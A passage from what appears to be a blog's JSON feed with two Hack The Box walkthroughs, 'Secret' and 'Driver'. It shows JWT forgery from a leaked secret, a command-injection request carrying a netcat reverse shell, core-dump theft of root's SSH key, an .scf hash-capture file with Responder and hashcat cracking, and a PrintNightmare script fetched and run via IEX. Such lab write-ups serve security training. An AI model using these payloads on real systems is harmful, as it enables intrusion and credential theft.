folder:──(kali㉿kali)-[~/…/Other/HacktheBox/Secret/local-web]└─$ ls -latotal 52drwxr-xr-x 9 kali kali 4096 Jul 11 05:33 .drwxr-xr-x 3 kali kali 4096 Jul 11 05:08 ..-rw-r--r-- 1 kali kali 72 Sep 3 2021 .envdrwxr-xr-x 8 kali kali 4096 Sep 8 2021 .gitWe could extract the folder with gittools.All you need to do is run the extractor.sh, set the filepath to the .git folder and set the path where you want to store the extracted git folders.┌──(kali㉿kali)-[/opt/tools/GitTools/Extractor]└─$ ./extractor.sh /home/kali/Documents/Other/HacktheBox/Secret/local-web/ /home/kali/Documents/Other/HacktheBox/Secret/local-web/Extracted_git/ 1 ⨯############ Extractor is part of https://github.com/internetwache/GitTools## Developed and maintained by @gehaxelt from @internetwache## Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes!###########[+] Found commit: 4e5547295cfe456d8ca7005cb823e1101fd1f9cb[+] Found file: /home/kali/Documents/Other/HacktheBox/Secret/local-web//0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env[+] Found file: /home/kali/Documents/Other/HacktheBox/Secret/local-web//0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/index.js[+] Found folder: /home/kali/Documents/Other/HacktheBox/Secret/local-web//0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/model[...]Let’s go to the extracted git files:┌──(kali㉿kali)-[~/…/HacktheBox/Secret/local-web/Extracted_git]└─$ ls -latotal 100drwxr-xr-x 8 kali kali 4096 Jul 11 05:33 .drwxr-xr-x 9 kali kali 4096 Jul 11 05:33 ..drwxr-xr-x 7 kali kali 4096 Jul 11 05:22 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cbdrwxr-xr-x 7 kali kali 4096 Jul 11 05:23 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8drwxr-xr-x 7 kali kali 4096 Jul 11 05:25 2-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78drwxr-xr-x 7 kali kali 4096 Jul 11 05:26 3-de0a46b5107a2f4d26e348303e76d85ae4870934drwxr-xr-x 7 kali kali 4096 Jul 11 05:27 4-e297a2797a5f62b6011654cf6fb6ccb6712d2d5bdrwxr-xr-x 7 kali kali 4096 Jul 11 05:28 5-3a367e735ee76569664bf7754eaaade7c735d702Eventually I found a secret token in the .env file:┌──(kali㉿kali)-[~/…/HacktheBox/Secret/local-web/1-55fe756a29268f9b4e786ae468952ca4a8df1bd8]└─$ cat .envDB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE So what do we have so far? We have an authentication token of our regular user, we have a name theadmin to authenticate as the admin userand we have a secret_token.With all this information we can forge the JWT token.Creating admin JWT tokenI used the website jwt.io to change the authentication token of the regular user:JWT token of the regular userChange the name of the regular user Ch1mpey to that of the admin user theadmin and add the secret token:JWT token of the admin userNow that we have created a new token we can FINALLY make a request to /api/priv with the new token in the header.GET /api/priv HTTP/1.1Host: 10.129.44.169User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: application/jsonAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateauth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmNiZGIyMDVlMzY1NTA0NzkwMzlkMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5ubCIsImlhdCI6MTY1NzUyODc5OX0.rHd4mGTO0BEalykzr4gdIBxX9aw6sG_G4c5ZJ2dkfnIReferer: http://10.129.44.169:3000/docsConnection: closeUpgrade-Insecure-Requests: 1Success! We get a message back, saying Welcome back adminAuthenticated as the admin userOkay so now what? Well, remember /routes/private.js? There is more to it!router.get('/logs', verifytoken, (req, res) =&gt; { const file = req.query.file; const userinfo = { name: req.user } const name = userinfo.name.name; if (name == 'theadmin'){ const getLogs = `git log --oneline ${file}`; exec(getLogs, (err , output) =&gt;{ if(err){ res.status(500).send(err); return } res.json(output); }) } else{ res.json({ role: { role: \"you are normal user\", desc: userinfo.name.name } }) }})As we can see, we can make a GET request to /logs page and it requires a file parameter.You cannot tell me your fingers are not itching to see if the parameter is sanitized or not. ;)Let me spoil the suprise because I am too excited, it is not sanitized! Yay!Remote code executionSo if we send the following request:GET /api/logs?file=;id HTTP/1.1Host: 10.129.44.169User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: application/jsonAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateauth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmNiZGIyMDVlMzY1NTA0NzkwMzlkMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5ubCIsImlhdCI6MTY1NzUyODc5OX0.rHd4mGTO0BEalykzr4gdIBxX9aw6sG_G4c5ZJ2dkfnIReferer: http://10.129.44.169:3000/docsConnection: closeUpgrade-Insecure-Requests: 1The server will return the following:\"80bf34c fixed typos 🎉\\n0c75212 now we can view logs from server 😃\\nab3e953 Added the codes\\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\\n\"Now let’s try the following reverse shell:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR-IP&gt; &gt;/tmp/fThe request should look like the following, make sure there are no spaces:GET /api/logs?file=;rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.32+53+&gt;/tmp/f HTTP/1.1Host: 10.129.44.169User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: application/jsonAccept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateauth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmNiZGIyMDVlMzY1NTA0NzkwMzlkMmIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5ubCIsImlhdCI6MTY1NzUyODc5OX0.rHd4mGTO0BEalykzr4gdIBxX9aw6sG_G4c5ZJ2dkfnIReferer: http://10.129.44.169:3000/docsConnection: closeUpgrade-Insecure-Requests: 1Before you send the request, do not forget to setup a listener.┌──(kali㉿kali)-[~/…/Other/HacktheBox/Secret/local-web]└─$ nc -nlvp 53 listening on [any] 53 ...connect to [10.10.14.32] from (UNKNOWN) [10.129.44.169] 46352/bin/sh: 0: can't access tty; job control turned off$ iduid=1000(dasith) gid=1000(dasith) groups=1000(dasith)$ Now let’s get that sweet, sweet user flag:$ cd /home$ lsdasith$ cd dasith$ lslocal-webuser.txt$ cat user.txt44b8b6[...]Privilege escalationWe are almost there guys, so bear with me. After some enumeration, I noticed something interessting while checking theSUIDs:dasith@secret:~$ find / -type f -perm -u=s 2&gt;/dev/nullfind / -type f -perm -u=s 2&gt;/dev/null/usr/bin/pkexec/usr/bin/sudo/usr/bin/fusermount/usr/bin/umount/usr/bin/mount/usr/bin/gpasswd/usr/bin/su/usr/bin/passwd/usr/bin/chfn/usr/bin/newgrp/usr/bin/chsh/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/opt/countThe /opt/count directory stands out by far, so let’s see what is in the opt directory:dasith@secret:/opt$ ls -lahls -lahtotal 56Kdrwxr-xr-x 2 root root 4.0K Oct 7 10:06 .drwxr-xr-x 20 root root 4.0K Oct 7 15:01 ..-rw-r--r-- 1 root root 3.7K Oct 7 10:01 code.c-rw-r--r-- 1 root root 16K Oct 7 10:01 .code.c.swp-rwsr-xr-x 1 root root 18K Oct 7 10:03 count-rw-r--r-- 1 root root 4.6K Oct 7 10:04 valgrind.logBefore we take a closer look at the count script, let’s create a more stable shell:python3 -c 'import pty;pty.spawn(\"/bin/bash\")'Now let’s run the count script and see what happens:dasith@secret:/opt$ ./count./countEnter source file/directory name: /root/root.txt/root/root.txtTotal characters = 33Total words = 2Total lines = 2Save results a file? [y/N]: yIt asked for a source file and it seems to count the characters, words and lines.if we look at the source code in code.cdasith@secret:/opt$ ls -lals -latotal 56drwxr-xr-x 2 root root 4096 Oct 7 2021 .drwxr-xr-x 20 root root 4096 Oct 7 2021 ..-rw-r--r-- 1 root root 3736 Oct 7 2021 code.c-rw-r--r-- 1 root root 16384 Oct 7 2021 .code.c.swp-rwsr-xr-x 1 root root 17824 Oct 7 2021 count-rw-r--r-- 1 root root 4622 Oct 7 2021 valgrind.logThere is an interseting line:// Enable coredump generation prctl(PR_SET_DUMPABLE, 1);I found the following explanation here PR_SET_DUMPABLE (since Linux 2.3.20) Set the state of the \"dumpable\" attribute, which determines whether core dumps are produced for the calling process upon delivery of a signal whose default behavior is to produce a core dump.So I guess we could try to crash the program and see what gets stored in coredump.CoredumpWhat we could do is run the count program and setup a second shell to crash it.You can create a second shell via the same method we described above.Run the count program with the first shell:dasith@secret:/opt$ ./count./countEnter source file/directory name: /root/Now let’s see in the second shell if the program is indeed running:dasith@secret:~/local-web$ ps -aux | grep countps -aux | grep countroot 822 0.0 0.1 235668 7428 ? Ssl 13:58 0:00 /usr/lib/accountsservice/accounts-daemondasith 1936 0.0 0.0 2488 524 pts/0 S+ 15:44 0:00 ./countdasith 1938 0.0 0.0 6432 736 pts/1 S+ 15:45 0:00 grep --color=auto countKill the process in the second shell:dasith@secret:~/local-web$ kill -BUS 1936kill -BUS 1936Alrighty, run the count script again and see if the content of the root folder shows:dasith@secret:/opt$ ./count./countEnter source file/directory name: /root//root/-rw-r--r-- .viminfodrwxr-xr-x ..-rw-r--r-- .bashrcdrwxr-xr-x .localdrwxr-xr-x snaplrwxrwxrwx .bash_historydrwx------ .configdrwxr-xr-x .pm2-rw-r--r-- .profiledrwxr-xr-x .vimdrwx------ .drwx------ .cache-r-------- root.txtdrwxr-xr-x .npmdrwx------ .sshAwesome! We see there is also an .ssh folder. This could be our way in.Let’s run the program again, but this time use the id_rsa.pub as source file:dasith@secret:/opt$ ./count./countEnter source file/directory name: /root/.ssh/id_rsa/root/.ssh/id_rsa.pubKill the process again in the second shell.when the program crashed go to the coredump file and copy the contents to the /tmp/ folder&gt; cd /var/crash &gt; apport-unpack _opt_count.1000.crash /tmp/testUse strings so can we filter out any binary. You will notice that the file contains the ssh key:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfrMuWbtA4YZnK1QI7dI2lHm90N/E3OV+RTDiczD+EWWlE9opFuLcpRmwErKCg6/OaHNZhyzjXdQMmpQxaz6j07B6rS+LBDVAmZXDO+oWMU1LHNcRWiOagJ4/D7vA2vGK2Q+ua5WJY8ZAKi0EMJmafhY1s1PSRyx8D5vjEH5qbq3IO2GqN88meBE5/RnbqUDXHDQ6agJ3KG9DdrOVuRlnsRZ5O1D8Rhx1ih9rz+ZtD5qY5v1hqpYaIFqLr3DQfN/TqUHxzHwb4psY9w3Xvhrrrp1HAMWZut32dz0TZgaflpR8yS9tomip0dEcYI3Wsjvwnus9FpMLxpO4Ep7E9VVeEE7r57WG247fWscxMcAG3j7orjC/ti+ZfPcDHgchJx+ilWXt+62cRok98cF2DbnJduLyVp8oAZActmMP2+zISLnCqhU5hqVNcRdnA6uy2ndj3dUrHiQYYGqi8Eoy2VFqJz5hO/S9Nbd+Kz13toyoum64UwQfFNA/Kivf79oQeIss= root@localhostLogin via ssh with the obtained key:┌──(kali㉿kali)-[~/Documents/HacktheBox/secret]└─$ sudo ssh root@10.129.217.241 -i id_rsa 255 ⨯Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 18 Nov 2021 03:47:38 PM UTC System load: 0.06 Processes: 225 Usage of /: 52.6% of 8.79GB Users logged in: 0 Memory usage: 9% IPv4 address for eth0: 10.129.217.241 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Tue Oct 26 16:35:01 2021 from 10.10.14.6root@secret:~# iduid=0(root) gid=0(root) groups=0(root)root@secret:~# And there you have it, we are root!See you on the next hacking adventure!" }, { "title": "HTB-Driver", "url": "/posts/DRIVER/", "categories": "HACK THE BOX, Driver", "tags": "driver", "date": "2022-07-10 11:27:10 +0200", "snippet": "categories: [Hack the Box]tags: [Driver]—Target machine: 10.129.195.84Attack machine: 10.10.14.11Driver form Hack the BoxIndex NMAP SMB-share file attack Privileged Escalation Print Nightmare Before I start with hacking I always edit the /etc/hosts file, mostly out of ease:&lt;TARGET-IP&gt; driver.htbNow lets start with an Nmap scan to see what juicy TCP ports are open.NMAP┌──(kali㉿kali)-[~/Documents/HacktheBox/Driver]└─$ sudo nmap -p80,135,445,5985 -sV -sC -T4 -Pn -oA 10.129.195.84 10.129.195.84[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 08:51 ESTNmap scan report for driver.htb (10.129.195.84)Host is up (0.023s latency).PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: Site doesn't have a title (text/html; charset=UTF-8).| http-methods: |_ Potentially risky methods: TRACE| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=MFP Firmware Update Center. Please enter password for admin|_http-server-header: Microsoft-IIS/10.0135/tcp open msrpc Microsoft Windows RPC445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2021-11-19T20:51:26|_ start_date: 2021-11-19T20:28:32| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-security-mode: | authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 47.61 secondsIf we look at the nmap scan we see that we have a Windows server with a website on port 80, Microsoft Windows RPC on port 135 and an SMB port on 445.Port 80 is always a good start to begin with, so let’s browse to http://driver.htb.The site uses basic authetication and I was able to authenticate with the famous duo admin:admin.MFP Firmware Update CenterFirst glance at the website shows us that this is printer management software that you can use to update the firmware.File UploadI was able to upload my own files but none of my reverse shell attempts worked. Eventuallywith some google searching I stumbled on the SMB-share file attack. You can find the article here.So lets try it out.SMB-share file attackAs described in the article: let’s open a text editor and create the following .scf file:[Shell]Command=2IconFile=\\\\&lt;ATTACK-MACHINE-IP&gt;\\share\\test.ico[Taskbar]Command=ToggleDesktopBefore we upload the file make sure you have Responder listening.sudo responder -wrf --lm -v -I tun0Now let’s upload the malicious .scf file we created. After the upload we will seethat Responder captured an NTLM2 hash. If you are not sure with what hash you’re dealing withyou can run tools like Hash-Identifier or use the Hashcat-wikior let John the Ripper make a guess for you.[SMB] NTLMv2 Client : 10.129.186.144[SMB] NTLMv2 Username : DRIVER\\tony[SMB] NTLMv2 Hash : tony::DRIVER:519b5e6d8014443e:84EECB86F592AD33C14BCFD75FADF8B0:010100000000000014418EE67DEBD701176F0EFA5976B78000000000020000000000000000000000All you have to do now is crack the hash with your favourite tool, I used Hashcat.hashcat -m 5600 hash /usr/share/wordlists/rockyou.txtHashcat successfully cracked the hash and we now have the password: liltonyTONY::DRIVER:368ad063be1dd4f9:d2065c3cf444030f336f110dece37a04:01010000000000001fb200e77debd7014f2010d0d5eab9f300000000020000000000000000000000:liltonyLet’s try to login with Evil-Winrm:┌──(kali㉿kali)-[~]└─$ evil-winrm -i 10.129.186.144 -u 'tony' -p 'liltony' Evil-WinRM shell v2.4Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; whoamidriver\\tony*Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; Success! We’ve got the first user-flag:*Evil-WinRM* PS C:\\Users\\tony\\Desktop&gt; type user.txt4633df9a68[....]Privileged EscalationAfter some enumeration I found that the spoolsv service isrunning which is the print spooler service.This machine could be vulnerable for the print nightmare exploit if the Print Spooler service improperly performs privileged file operations.If this is the case, the machine is vulnerable for remote code execution.So let’s exploit this bad boy.Print NightmareSource: https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.htmlStart a webserver with the CVE-2021-1675.ps1 scriptpython3 -m http.serverOn the target machine, run the following to get the CVE-2021-1675.ps1 script.IEX(New-Object Net.Webclient).downloadstring('http://&lt;ATTACK-MACHINE-IP&gt;:8000/CVE-2021-1675.ps1')You can also upload the file via the upload function of Evil-WinRM.ANYHOW… now all we have to do is run the script on the target machine:*Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; Invoke-Nightmare -NewUser \"Testy\" -NewPassword \"Test123\"[+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\"[+] added user Testy as local administrator[+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dllThis should add a new user as local administrator.Let’s see if the Testy user is added and got the right privileges:*Evil-WinRM* PS C:\\Users\\tony\\Documents&gt; net user TestyUser name TestyFull Name TestyCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 12/7/2021 10:51:38 AMPassword expires NeverPassword changeable 12/7/2021 10:51:38 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon NeverLogon hours allowed AllLocal Group Memberships *AdministratorsGlobal Group memberships *NoneThe command completed successfully.Login with the new created account via Evil-Winrm┌──(kali㉿kali)-[~]└─$ evil-winrm -i 10.129.186.159 -u 'Testy' -p 'Test123'Evil-WinRM shell v2.4Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Testy\\Documents&gt; whoamidriver\\testyAnd we are there guys, get that beverage open and pop that bag of chips, you’ve earned it.*Evil-WinRM* PS C:\\Users\\Testy\\Documents&gt; cd C:\\Users\\Administrator*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktopd*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir Directory: C:\\Users\\Administrator\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 12/7/2021 10:19 AM 34 root.txt*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt997724e489b4[...]*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; Hope you had just as much fun as I had, see you on the next hacking adventure." } ]
